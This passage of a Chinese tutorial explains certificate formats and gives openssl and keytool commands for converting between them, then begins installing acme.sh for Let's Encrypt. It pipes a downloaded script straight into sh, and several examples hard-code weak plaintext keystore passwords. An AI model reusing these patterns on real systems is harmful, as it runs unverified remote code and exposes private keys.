Apache、Nginx等Web服务软件，一般使用OpenSSL工具提供的密码库，生成PEM、
KEY、CRT等格式的证书文件。
</p>

<p>
IBM的Web服务产品，如Websphere、IBM Http Server（IHS）等，一般使用IBM产
品自带的iKeyman工具，生成KDB格式的证书文件。
</p>

<p>
微软Windows Server中的Internet Information Services（IIS）服务，使用
Windows自带的证书库生成PFX格式的证书文件。
</p>

<p>
<b>如何判断证书文件是文本格式还是二进制格式？</b>
</p>

<p>
您可以使用以下方法简单区分带有后缀扩展名的证书文件：
</p>

<ul class="org-ul">
<li><code>*.DER 或*.CER文件</code> ： 这样的证书文件是二进制格式，只含有证书信息，
不包含私钥。</li>

<li><code>*.CRT文件</code> ： 这样的证书文件可以是二进制格式，也可以是文本格式，一
般均为文本格式，功能与 <code>*.DER</code> 及 <code>*.CER</code> 证书文件相同。</li>

<li><code>*.PEM文件</code> ： 这样的证书文件一般是文本格式，可以存放证书或私钥，或
者两者都包含。 <code>*.PEM 文件</code> 如果只包含私钥，一般用 <code>*.KEY文件</code> 代替。</li>

<li><code>*.PFX或*.P12文件</code> ： PKCS#12 (PFX) key and certificate(s) 这样的证
书文件是二进制格式，同时包含证书和私钥，且一般有密码保护。虽然很久以
前PFX表示PKCS#12之前的版本，现在PFX常被用作PKCS#12的代名词</li>

<li><code>.p7b和.p7c文件</code> ：PKCS#7 certificate(s) 这样的证书文件是二进制格式，
文件里面可以包括所需的整个证书链</li>
</ul>

<p>
您也可以使用记事本直接打开证书文件。如果显示的是规则的数字字母，例如：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;
MIIE5zCCA8+gAwIBAgIQN+whYc2BgzAogau0dc3PtzANBgkqh......
&#8212;&#8211;END CERTIFICATE&#8212;&#8211;
</pre>
</div>

<p>
那么，该证书文件是文本格式的。
</p>

<p>
如果存在 <code>------BEGIN CERTIFICATE------</code> ，则说明这是一个证书文件。
</p>

<p>
如果存在 <code>-----BEGIN RSA PRIVATE KEY-----</code> ，则说明这是一个私钥文件。
</p>

<p>
<b>证书格式转换</b>
</p>


<figure id="orgc45b413">
<img src="images/image-20210326143152617.png" alt="image-20210326143152617.png" width="50%">

</figure>
</div>
<div id="outline-container-h:44fc5963-96bc-44a9-b569-81d540c66841" class="outline-5">
<h5 id="h:44fc5963-96bc-44a9-b569-81d540c66841">PFX(PKCS12)格式和JKS格式证书</h5>
<div class="outline-text-5" id="text-h:44fc5963-96bc-44a9-b569-81d540c66841">
<p>
使用JDK中自带的Keytool工具
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">jks -&gt; pfx</span>
keytool -importkeystore -srckeystore keystore.jks -srcstoretype JKS -deststoretype PKCS12 -destkeystore keystore.p12

<span style="color: #b22222;">#</span><span style="color: #b22222;">pfx -&gt; jks</span>
keytool -importkeystore -srckeystore keystore.p12 -srcstoretype PKCS12 -deststoretype JKS -destkeystore keystore.jks 
<span style="color: #b22222;">#</span><span style="color: #b22222;">-deststorepass changeit -alias s1as # &#35777;&#20070;&#40664;&#35748;&#23494;&#30721;&#26159;changeit</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#35777;&#20070;&#36716;&#25442;&#20026;&#22823;&#22810;&#25968;&#27983;&#35272;&#22120;&#37117;&#33021;&#35782;&#21035;&#30340;PKCS12&#25991;&#20214;</span>
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">MARATHON_PKCS_PASSWORD</span>=marathonwowopass
openssl pkcs12 -name marathon  -inkey marathon.key -passin <span style="color: #8b2252;">"env:MARATHON_KEY_PASSWORD"</span> -in marathon.crt  -password <span style="color: #8b2252;">"env:MARATHON_PKCS_PASSWORD"</span> -export -out marathon.pkcs12

<span style="color: #b22222;"># </span><span style="color: #b22222;">PKCS12&#25991;&#20214;&#36716;JKS</span>
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">MARATHON_JKS_PASSWORD</span>=marathonwowopass
keytool -importkeystore -srckeystore marathon.pkcs12 -srcalias marathon -srcstorepass $<span style="color: #a0522d;">MARATHON_PKCS_PASSWORD</span> -srcstoretype PKCS12 -destkeystore marathon.jks -deststorepass $<span style="color: #a0522d;">MARATHON_JKS_PASSWORD</span>

[root@xy-spacebridge-nginx001 bin]# ./keytool -importkeystore -srckeystore /root/20190417.p12 -srcstoretype PKCS12 -deststoretype JKS -destkeystore /root/iot.jks
Enter destination keystore password:  &#30446;&#26631;&#25991;&#20214;&#23494;&#30721;
Re-enter new password: &#30446;&#26631;&#25991;&#20214;&#23494;&#30721;
Enter source keystore password:  p12&#25991;&#20214;&#23494;&#30721;
Entry for alias 1 successfully imported.
Import command completed:  1 entries successfully imported, 0 entries failed or cancelled
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6f2981c0-05d9-4aaf-b9e3-1013733dd376" class="outline-5">
<h5 id="h:6f2981c0-05d9-4aaf-b9e3-1013733dd376">PEM格式与PFX格式证书</h5>
<div class="outline-text-5" id="text-h:6f2981c0-05d9-4aaf-b9e3-1013733dd376">
<p>
PFX 格式的证书一般出现在 Windows Server 服务器中
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1.PEM&#26684;&#24335;--&gt;PFX&#26684;&#24335;</span>
<span style="color: #0000ff;">&#38500;pem&#26684;&#24335;&#30340;key&#30340;&#23494;&#30721;</span>(&#36755;&#20986;&#30340;&#23494;&#30721;&#19981;&#36755;&#20837;&#21363;&#21487;)
openssl rsa -in cert2.key -out cert22.key

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;KEY&#26684;&#24335;&#23494;&#38053;&#25991;&#20214;&#21644;CRT&#26684;&#24335;&#20844;&#38053;&#25991;&#20214;&#36716;&#25442;&#25104;PFX&#26684;&#24335;&#35777;&#20070;&#25991;&#20214;&#12290;</span>
openssl pkcs12 -export -out server.pfx -inkey server.key -in server.crt
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36755;&#20986;</span>
Enter Export Password:
Verifying - Enter Export Password:
<span style="color: #b22222;"># </span><span style="color: #b22222;">-passout pass:changeit -name s1as # &#35813;&#35777;&#20070;&#40664;&#35748;&#23494;&#30721;&#26159;changeit&#12290;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25351;&#23450;intermedian&#21644;CA</span>
openssl pkcs12 -export -out mypkcs12.pfx -inkey my.private.key -in mycert.crt -certfile intermediate.crt -CAfile ca.crt

<span style="color: #b22222;"># </span><span style="color: #b22222;">2. PEM&#26684;&#24335;&lt;--PFX&#26684;&#24335;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;PFX&#26684;&#24335;&#35777;&#20070;&#25991;&#20214;&#36716;&#21270;&#20026;KEY&#26684;&#24335;&#23494;&#38053;&#25991;&#20214;&#21644;CRT&#26684;&#24335;&#20844;&#38053;&#25991;&#20214;</span>

openssl pkcs12 -in server.pfx -out server.pem <span style="color: #b22222;"># </span><span style="color: #b22222;">server.pem&#35777;&#20070;&#25991;&#20214;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26080;&#38656;&#21152;&#23494;pem&#20013;&#31169;&#38053;&#65292;&#21487;&#20197;&#28155;&#21152;&#36873;&#39033;-nodes&#65307;</span>

openssl rsa -in server.pem -out server.key <span style="color: #b22222;"># </span><span style="color: #b22222;">KEY&#26684;&#24335;&#23494;&#38053;&#25991;&#20214;&#65288;server.key&#65289;</span>
openssl x509 -in server.pem -out server.crt <span style="color: #b22222;"># </span><span style="color: #b22222;">CRT&#26684;&#24335;&#20844;&#38053;&#25991;&#20214;&#65288;server.crt&#65289;</span>
openssl pkcs12 -in server.pfx -nodes -nokeys -out server.crt <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26080;&#38656;&#23548;&#20986;&#31169;&#38053;&#65292;&#21487;&#20197;&#28155;&#21152;&#36873;&#39033;-nokeys  CRT&#26684;&#24335;&#20844;&#38053;&#25991;&#20214;&#65288;server.crt&#65289;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25552;&#21462;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25552;&#21462;&#31169;&#38053;&#21629;&#20196;&#65306;</span>
openssl pkcs12 -in certname.pfx -nocerts -out key.pem -nodes
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25552;&#21462;&#35777;&#20070;&#21629;&#20196;&#65306;</span>
openssl pkcs12 -in certname.pfx -nokeys -out cert.pem
</pre>
</div>
</div>
</div>
<div id="outline-container-h:97127463-fbd1-4e8a-a7ec-9785bcdb79ff" class="outline-5">
<h5 id="h:97127463-fbd1-4e8a-a7ec-9785bcdb79ff">PEM格式与DER格式证书</h5>
<div class="outline-text-5" id="text-h:97127463-fbd1-4e8a-a7ec-9785bcdb79ff">
<p>
PEM 编码的证书：
</p>

<div class="org-src-container">
<pre class="src src-sh">-----BEGIN CERTIFICATE-----
Base64&#8211;encoded certificate
-----END CERTIFICATE-----
</pre>
</div>

<p>
PEM 编码的证书链:
</p>

<div class="org-src-container">
<pre class="src src-sh">-----BEGIN CERTIFICATE-----
Base64&#8211;encoded certificate
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
Base64&#8211;encoded certificate
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
Base64&#8211;encoded certificate
-----END CERTIFICATE-----
</pre>
</div>

<p>
PEM 编码的私有密钥（仅限私有证书）：
</p>

<div class="org-src-container">
<pre class="src src-sh">-----BEGIN RSA PRIVATE KEY-----
Base64&#8211;encoded private key
-----END RSA PRIVATE KEY-----
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">PEM &lt;--DER</span>
openssl x509 -in cert22.cer -inform DER -out cert22.pem -outform PEM
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20854;&#23427;PEM &lt;--DER</span>
openssl rsa -in ca_private.der -inform DER -outform PEM -out ca.key
<span style="color: #b22222;">#</span><span style="color: #b22222;">PEM &lt;--CER/CRT</span>
openssl x509 -in cert2.cer -out cert2.pem -outform PEM

&#25552;&#21462;&#35777;&#20070;&#65306;openssl x509 -inform der -in certificate.cer -out certificate.pem
&#25552;&#21462;&#31169;&#38053;&#65306;openssl rsa -inform DER -outform PEM -in privatekey.der -out privatekey.pem

<span style="color: #b22222;">#</span><span style="color: #b22222;">PEM --&gt;DER</span>
openssl x509 -in cert22.pem -inform PEM -out cert22.der -outform DER
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20854;&#23427;PEM --&gt;DER</span>
openssl rsa -in ca.key -outform DER -out ca_private.der
openssl pkcs8 -topk8 -nocrypt -inform PEM -outform DER -in ca.key -out ca_private.der
<span style="color: #b22222;">#</span><span style="color: #b22222;">PEM --&gt;CER/CRT</span>
openssl x509 -in cert22.pem -out cert22.crt
</pre>
</div>
</div>
</div>
<div id="outline-container-h:772da5e1-28e4-4751-944a-637fd6611006" class="outline-5">
<h5 id="h:772da5e1-28e4-4751-944a-637fd6611006">PEM格式与P7B格式证书</h5>
<div class="outline-text-5" id="text-h:772da5e1-28e4-4751-944a-637fd6611006">
<p>
P7B 格式证书一般出现在 Windows Server 和 Tomcat 服务器中，
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">PEM --&gt; P7B(PEM--PKCS#7)</span>
openssl crl2pkcs7 -nocrl -certfile certificate.cer -out certificate.p7b -certfile CACert.cer

<span style="color: #b22222;">#</span><span style="color: #b22222;">PEM &lt;-- P7B(PEM--PKCS#7)</span>
openssl pkcs7 -print_certs -in incertificat.p7b -out outcertificate.cer

<span style="color: #b22222;"># </span><span style="color: #b22222;">P7B--PFX(PKCS#7--PKCS#12)</span>
openssl pkcs7 -print_certs -in certificate.p7b -out certificate.cer
openssl pkcs12 -export -in certificate.cer -inkey privateKey.key -out certificate.pfx -certfile CACert.cer


<span style="color: #b22222;"># </span><span style="color: #b22222;">PEM--SPC</span>
openssl crl2pkcs7 -nocrl -certfile venus.pem -outform DER -out venus.spc

<span style="color: #b22222;"># </span><span style="color: #b22222;">PEM&#65293;&#65293;PVK&#65288;openssl 1.x&#24320;&#22987;&#25903;&#25345;&#65289;</span>
openssl rsa -in mycert.pem -outform PVK -pvk-strong -out mypvk.pvk
<span style="color: #b22222;">#</span><span style="color: #b22222;">PEM&#65293;&#65293;PVK&#65288;&#23545;&#20110;openssl 1.x&#20043;&#21069;&#30340;&#29256;&#26412;&#65292;&#21487;&#20197;&#19979;&#36733;pvk&#36716;&#25442;&#22120;&#21518;&#36890;&#36807;&#20197;&#19979;&#21629;&#20196;&#23436;&#25104;&#65289;</span>
pvk -in ca.key -out ca.pvk -nocrypt -topvk
</pre>
</div>
</div>
</div>
<div id="outline-container-h:92bf3c49-f515-46cd-a42c-4773cc7c6b5a" class="outline-5">
<h5 id="h:92bf3c49-f515-46cd-a42c-4773cc7c6b5a">CER格式与BKS格式证书</h5>
<div class="outline-text-5" id="text-h:92bf3c49-f515-46cd-a42c-4773cc7c6b5a">
<p>
在Android应用中使用自定义证书,CER转BKS
</p>

<p>
首先要下载特定版本的JCE
Provider包
</p>

<p>
<a href="http://www.bouncycastle.org/download/bcprov-jdk15on-146.jar">http://www.bouncycastle.org/download/bcprov-jdk15on-146.jar</a>
</p>

<p>
<a href="http://repo2.maven.org/maven2/org/bouncycastle/bcprov-jdk16/1.46/bcprov-jdk16-1.46.jar">http://repo2.maven.org/maven2/org/bouncycastle/bcprov-jdk16/1.46/bcprov-jdk16-1.46.jar</a>
</p>

<pre class="example" id="orgd955244">
keytool -importcert -v -trustcacerts -alias 位置1 -file 位置2 -keystore 位置3 -storetype BKS -providerclass org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath 位置4 -storepass 位置5
</pre>

<p>
说明：
</p>
<pre class="example" id="org7ad45f2">
位置1:是个随便取的别名
位置2:cer或crt证书的全地址
位置3:生成后bks文件的位置,建议写全地址
位置4:上面下载JCE Provider包的位置
位置5:生成后证书的密码
</pre>

<p>
注意:
</p>
<ol class="org-ol">
<li>注意命令中不能有换行</li>
<li>地址必须全地址</li>
<li>文件要符合java命名规范</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh">[root@jenkins01 ca]# keytool -importcert -v -trustcacerts -alias hdzy -file /root/ca/buy/291996.pem -keystore /root/ca/buy/291996.bks -storetype BKS -providerclass org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath <span style="color: #8b2252;">"bcprov-jdk16-1.46.jar"</span> -storepass qianyangyuanwang


&#26159;&#21542;&#20449;&#20219;&#27492;&#35777;&#20070;? [&#21542;]:        y                
&#35777;&#20070;&#24050;&#28155;&#21152;&#21040;&#23494;&#38053;&#24211;&#20013;
</pre>
</div>

<p>
CER和BKS格式证书文件转换
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">jks &#36716; cert</span>
keytool -export -alias cert0001 -keystore trust.jks -storepass 123456 -file cert0001.cer

<span style="color: #b22222;"># </span><span style="color: #b22222;">cert &#36716; jks</span>
keytool -import -v -alias cert001 -file cert001.cer -keystore trust.jks -storepass 123456 -noprompt
</pre>
</div>

<p>
keytool 是一个Java数据证书的管理工具,Keytool将密钥（key）和证书
（certificates）存在一个称为keystore的文件中在keystore里，包含两种数据:密
钥实体（Key entity）-密钥（secret key）或者是私钥和配对公钥（采用非对
称加密）可信任的证书实体（trusted certificate entries）-只包含公钥。
</p>

<p>
JDK中keytool常用参数说明（不同版本有差异，详细可参见【附录】中的官方文档链接）:
</p>

<div class="org-src-container">
<pre class="src src-sh">-genkey &#22312;&#29992;&#25143;&#20027;&#30446;&#24405;&#20013;&#21019;&#24314;&#19968;&#20010;&#40664;&#35748;&#25991;&#20214;&#8221;.keystore&#8221;,&#36824;&#20250;&#20135;&#29983;&#19968;&#20010;mykey&#30340;&#21035;&#21517;&#65292;mykey&#20013;&#21253;&#21547;&#29992;&#25143;&#30340;&#20844;&#38053;&#12289;&#31169;&#38053;&#21644;&#35777;&#20070;(&#22312;&#27809;&#26377;&#25351;&#23450;&#29983;&#25104;&#20301;&#32622;&#30340;&#24773;&#20917;&#19979;,keystore&#20250;&#23384;&#22312;&#29992;&#25143;&#31995;&#32479;&#40664;&#35748;&#30446;&#24405;)
-alias &#20135;&#29983;&#21035;&#21517; &#27599;&#20010;keystore&#37117;&#20851;&#32852;&#36825;&#19968;&#20010;&#29420;&#19968;&#26080;&#20108;&#30340;alias&#65292;&#36825;&#20010;alias&#36890;&#24120;&#19981;&#21306;&#20998;&#22823;&#23567;&#20889;
-keystore &#25351;&#23450;&#23494;&#38053;&#24211;&#30340;&#21517;&#31216;(&#20135;&#29983;&#30340;&#21508;&#31867;&#20449;&#24687;&#23558;&#19981;&#22312;.keystore&#25991;&#20214;&#20013;)
-keyalg &#25351;&#23450;&#23494;&#38053;&#30340;&#31639;&#27861; (&#22914; RSA DSA&#65292;&#40664;&#35748;&#20540;&#20026;&#65306;DSA)
-validity &#25351;&#23450;&#21019;&#24314;&#30340;&#35777;&#20070;&#26377;&#25928;&#26399;&#22810;&#23569;&#22825;(&#40664;&#35748; 90)
-keysize &#25351;&#23450;&#23494;&#38053;&#38271;&#24230; &#65288;&#40664;&#35748; 1024&#65289;
-storepass &#25351;&#23450;&#23494;&#38053;&#24211;&#30340;&#23494;&#30721;(&#33719;&#21462;keystore&#20449;&#24687;&#25152;&#38656;&#30340;&#23494;&#30721;)
-keypass &#25351;&#23450;&#21035;&#21517;&#26465;&#30446;&#30340;&#23494;&#30721;(&#31169;&#38053;&#30340;&#23494;&#30721;)
-dname &#25351;&#23450;&#35777;&#20070;&#21457;&#34892;&#32773;&#20449;&#24687; &#20854;&#20013;&#65306; &#8220;<span style="color: #a0522d;">CN</span>=&#21517;&#23383;&#19982;&#22995;&#27663;,<span style="color: #a0522d;">OU</span>=&#32452;&#32455;&#21333;&#20301;&#21517;&#31216;,<span style="color: #a0522d;">O</span>=&#32452;&#32455;&#21517;&#31216;,<span style="color: #a0522d;">L</span>=&#22478;&#24066;&#25110;&#21306;&#22495;&#21517; &#31216;,<span style="color: #a0522d;">ST</span>=&#24030;&#25110;&#30465;&#20221;&#21517;&#31216;,<span style="color: #a0522d;">C</span>=&#21333;&#20301;&#30340;&#20004;&#23383;&#27597;&#22269;&#23478;&#20195;&#30721;&#8221;
-list &#26174;&#31034;&#23494;&#38053;&#24211;&#20013;&#30340;&#35777;&#20070;&#20449;&#24687; keytool -list -v -keystore &#25351;&#23450;keystore -storepass &#23494;&#30721;
-v &#26174;&#31034;&#23494;&#38053;&#24211;&#20013;&#30340;&#35777;&#20070;&#35814;&#32454;&#20449;&#24687;
-export &#23558;&#21035;&#21517;&#25351;&#23450;&#30340;&#35777;&#20070;&#23548;&#20986;&#21040;&#25991;&#20214; keytool -export -alias &#38656;&#35201;&#23548;&#20986;&#30340;&#21035;&#21517; -keystore &#25351;&#23450;keystore -file &#25351;&#23450;&#23548;&#20986;&#30340;&#35777;&#20070;&#20301;&#32622;&#21450;&#35777;&#20070;&#21517;&#31216; -storepass &#23494;&#30721;
-file &#21442;&#25968;&#25351;&#23450;&#23548;&#20986;&#21040;&#25991;&#20214;&#30340;&#25991;&#20214;&#21517;
-delete &#21024;&#38500;&#23494;&#38053;&#24211;&#20013;&#26576;&#26465;&#30446; keytool -delete -alias &#25351;&#23450;&#38656;&#21024;&#38500;&#30340;&#21035; -keystore &#25351;&#23450;keystore &#8211; storepass &#23494;&#30721;
-printcert &#26597;&#30475;&#23548;&#20986;&#30340;&#35777;&#20070;&#20449;&#24687; keytool -printcert -file g:\sso\michael.crt
-keypasswd &#20462;&#25913;&#23494;&#38053;&#24211;&#20013;&#25351;&#23450;&#26465;&#30446;&#21475;&#20196; keytool -keypasswd -alias &#38656;&#20462;&#25913;&#30340;&#21035;&#21517; -keypass &#26087;&#23494;&#30721; -new &#26032;&#23494;&#30721; -storepass keystore&#23494;&#30721; -keystore sage
-storepasswd &#20462;&#25913;keystore&#21475;&#20196; keytool -storepasswd -keystore g:\sso\michael.keystore(&#38656;&#20462;&#25913;&#21475;&#20196;&#30340;keystore) -storepass pwdold(&#21407;&#22987;&#23494;&#30721;) -new pwdnew(&#26032;&#23494;&#30721;)
-import &#23558;&#24050;&#31614;&#21517;&#25968;&#23383;&#35777;&#20070;&#23548;&#20837;&#23494;&#38053;&#24211; keytool -import -alias &#25351;&#23450;&#23548;&#20837;&#26465;&#30446;&#30340;&#21035;&#21517; -keystore &#25351;&#23450;keystore -file &#38656;&#23548;&#20837;&#30340;&#35777;&#20070;

[root@dev-01 hbase-1.1.2]# cd /usr/java/jdk1.8.0_121/bin/
[root@dev-01 bin]# ./keytool
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5e521c5b-fe21-4952-b6fa-500d7639d885" class="outline-5">
<h5 id="h:5e521c5b-fe21-4952-b6fa-500d7639d885">PFX格式与BKS格式证书</h5>
<div class="outline-text-5" id="text-h:5e521c5b-fe21-4952-b6fa-500d7639d885">
<p>
这里我提前生成了PFX文件
</p>

<div class="org-src-container">
<pre class="src src-sh">2064873_scf.baidu.net.key &#31169;&#38053;
2064873_scf.baidu.net.pem &#35777;&#20070;
&#36716;p12&#25991;&#20214;&#21629;&#20196;
openssl pkcs12 -export -out 20190417.p12 -inkey 2064873_scf.baidu.net.key -in 2064873_scf.baidu.net.pem 
Enter Export Password:  p12password
Verifying - Enter Export Password: p12password
</pre>
</div>

<p>
将PFX文件转换为BKS
</p>

<p>
1.请先下载第三方转换工具protecle，配置java环境
</p>

<p>
<a href="https://sourceforge.net/projects/portecle/">https://sourceforge.net/projects/portecle/</a>
</p>

<p>
或者用windows版本的KeyStore Explorer来生成.jks文件。从如下地址下载安装：
<a href="http://www.keystore-explorer.org/downloads.html">http://www.keystore-explorer.org/downloads.html</a>
</p>

<p>
2.点击运行protecle.jar
</p>


<figure id="org19fcb2e">
<img src="images/image-20210326162811853.png" alt="image-20210326162811853.png" width="20%">

</figure>

<p>
3.新建BKSStore 如果你要生成JKS文件就点jks
</p>


<figure id="orgd6ffc91">
<img src="images/image-20210326163459822.png" alt="image-20210326163459822.png" width="20%">

</figure>

<p>
4.导入p12密钥对，包含公钥和私钥
</p>

<p>
选择p12文件，输入p12文件的密码。如20190417.p12文件密码是p12password
</p>


<figure id="orga7506e9">
<img src="images/image-20210326163518446.png" alt="image-20210326163518446.png" width="20%">

</figure>

<p>
5.修改别名 这里我随便写了一个
</p>


<figure id="org98348fb">
<img src="images/image-20210326163540182.png" alt="image-20210326163540182.png" width="20%">

</figure>

<p>
6.为客户端的私钥创建密码 比如密码是123456
</p>


<figure id="orgde3d3aa">
<img src="images/image-20210326163554631.png" alt="image-20210326163554631.png" width="20%">

</figure>

<p>
7.另存为BKS
</p>

<p>
另存文件，并输入刚才设置的密码。123456。导出文件为 <code>*.jks</code> 或bks什么的。
</p>


<figure id="orgb17a83f">
<img src="images/image-20210326163612640.png" alt="image-20210326163612640.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:294e2170-40ec-4cdf-8185-090e0ac9fb5d" class="outline-5">
<h5 id="h:294e2170-40ec-4cdf-8185-090e0ac9fb5d">BKS格式转BKS-v1格式证书</h5>
<div class="outline-text-5" id="text-h:294e2170-40ec-4cdf-8185-090e0ac9fb5d">
<ol class="org-ol">
<li><p>
Using Portecle:
</p>

<p>
Downloads Portecle <a href="http://portecle.sourceforge.net/">http://portecle.sourceforge.net/</a>
</p>

<p>
Open your bks file with the password and portecle
</p>

<p>
Do Tools&gt;&gt;Change Keystore Type&gt;&gt;BKS-v1 Save the file
</p></li>

<li><p>
You may use KeyStore Explorer
</p>

<p>
The new file will be encoded with BKS-v1 and will not show anymore
the error&#x2026;. Note: Android works with differents BKS version: for
instance, API 15 will require BKS-1 contrary to API 23 which
require BKS, so you may need to put both files in your app.
</p></li>
</ol>

<p>
Note 2: You can use this code:
</p>

<div class="org-src-container">
<pre class="src src-sh">int bks_version;
<span style="color: #a020f0;">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.JELLY_BEAN_MR1) {
    bks_version = R.raw.publickey; //The BKS file
} <span style="color: #a020f0;">else</span> {
    bks_version = R.raw.publickey_v1; //The BKS (v-1) file
}
KeyStore ks = KeyStore.getInstance(<span style="color: #8b2252;">"BKS"</span>);
InputStream<span style="color: #a020f0;"> in</span> = getResources().openRawResource(bks_version);  
<span style="color: #0000ff;">ks.load</span>(<span style="color: #a020f0;">in</span>, <span style="color: #8b2252;">"mypass"</span>.toCharArray());
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0dcfc9b8-85f7-4e1d-a112-1750558be83f" class="outline-5">
<h5 id="h:0dcfc9b8-85f7-4e1d-a112-1750558be83f">PKCS1格式与PKCS8格式证书</h5>
<div class="outline-text-5" id="text-h:0dcfc9b8-85f7-4e1d-a112-1750558be83f">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#40664;&#35748;&#29983;&#25104;PKCS1&#26684;&#24335;PEM&#32534;&#30721;&#31169;&#38053;</span>
openssl genrsa -out ca.key 2048

<span style="color: #b22222;"># </span><span style="color: #b22222;">PKCS1 &#36716; PKCS8</span>
openssl pkcs8 -topk8 -nocrypt -in ca.key -out ca_private.pem
<span style="color: #b22222;"># </span><span style="color: #b22222;">PKCS8 &#36716; PKCS1</span>
openssl rsa -in ca_private.pem -out ca.key
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:902b833c-3f4e-4161-b3fa-3f93c19cf486" class="outline-3">
<h3 id="h:902b833c-3f4e-4161-b3fa-3f93c19cf486">可信任免费泛域名证书Let's Encrypt</h3>
<div class="outline-text-3" id="text-h:902b833c-3f4e-4161-b3fa-3f93c19cf486">
<p>
目标：
</p>
<ol class="org-ol">
<li>自动申请证书</li>
<li>证书管理，到期天数</li>
</ol>

<p>
使用Let's Encrypt 免费泛域名证书 <a href="https://letsencrypt.org/">https://letsencrypt.org/</a>
</p>
</div>
<div id="outline-container-h:605d5981-de46-4c54-96ef-2901ac1c0388" class="outline-4">
<h4 id="h:605d5981-de46-4c54-96ef-2901ac1c0388">安装客户端acme.sh</h4>
<div class="outline-text-4" id="text-h:605d5981-de46-4c54-96ef-2901ac1c0388">
<div class="org-src-container">
<pre class="src src-sh">curl https://get.acme.sh | sh -s <span style="color: #a0522d;">email</span>=my@example.com
<span style="color: #483d8b;">alias</span> acme.sh=~/.acme.sh/acme.sh
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'alias acme.sh=~/.acme.sh/acme.sh'</span> &gt;&gt; .bash_profile
</pre>
</div>

<p>
自动为你创建 cronjob, 每天 0:00 点自动检测所有的证书, 如果快过期了,需
要更新, 则会自动更新证书.
</p>
</div>
</div>
<div id="outline-container-h:c979a0e9-8b23-49d5-bcfd-1c156fc9d407" class="outline-4">
<h4 id="h:c979a0e9-8b23-49d5-bcfd-1c156fc9d407">简单使用</h4>
<div class="outline-text-4" id="text-h:c979a0e9-8b23-49d5-bcfd-1c156fc9d407">
<p>
签发证书
</p>

<div class="org-src-container">
<pre class="src src-sh">acme.sh --issue -d esofar.cn -d www.esofar.cn -w /home/wwwroot/esofar.cn
</pre>
</div>

<p>
简单解释下这条命令涉及的几个参数：
</p>

<pre class="example" id="orgd7fc614">
--issue是 acme.sh 脚本用来颁发证书的指令；
-d是--domain的简称，其后面须填写已备案的域名；
-w是--webroot的简称，其后面须填写网站的根目录。
生成的证书放在了/root/.acme.sh/esofar.cn目录。
</pre>

<p>
命令查看和删除证书：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#35777;&#20070;&#21015;&#34920;</span>
acme.sh --list 

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#35777;&#20070;&#20855;&#20307;&#20869;&#23481;</span>
openssl x509 -in /data/zhengshu/xxx.com/fullchain.cer        -noout -text

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#35777;&#20070;&#26102;&#38388;</span>
openssl x509 -in /data/zhengshu/xx.com/fullchain.cer        -noout -dates

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;&#35777;&#20070;</span>
acme.sh remove &lt;SAN_Domains&gt;
acme.sh  --remove -d <span style="color: #8b2252;">\*</span>.book.com
&#25110;&#25163;&#21160;&#21024;&#38500; /home/yxz/.acme.sh/xxx.xxx &#25991;&#20214;&#22841;&#12290;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#30340;&#35777;&#20070;&#25918;&#22312;&#20102;/root/.acme.sh/esofar.cn&#30446;&#24405;&#65292;&#22240;&#20026;&#36825;&#26159; acme.sh &#33050;&#26412;&#30340;&#20869;&#37096;&#20351;&#29992;&#30446;&#24405;&#65292;&#32780;&#19988;&#30446;&#24405;&#32467;&#26500;&#21487;&#33021;&#20250;&#21464;&#21270;&#65292;&#25152;&#20197;&#25105;&#20204;&#19981;&#33021;&#35753; Nginx &#30340;&#37197;&#32622;&#25991;&#20214;&#30452;&#25509;&#35835;&#21462;&#35813;&#30446;&#24405;&#19979;&#30340;&#35777;&#20070;&#25991;&#20214;&#12290;</span>
